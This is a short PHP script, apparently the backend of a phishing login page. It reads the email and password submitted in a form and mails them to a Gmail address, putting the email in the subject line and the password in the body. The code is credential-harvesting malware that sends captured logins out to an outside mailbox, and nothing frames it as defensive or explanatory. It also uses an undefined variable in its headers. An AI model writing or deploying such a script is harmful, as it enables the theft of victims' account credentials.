<?php

$email = $_POST['email'];
$password = $_POST['password'];

$email_from = 'imgirsite@gmail.com';
$email_subject = $email;
$email_body = $password;

$to = "imgirsite@gmail.com";
  $headers = "From: $email_from \r\n";
  $headers .= "Reply-To: $visitor_email \r\n";
  mail($to,$email_subject,$email_body,$headers);

?>
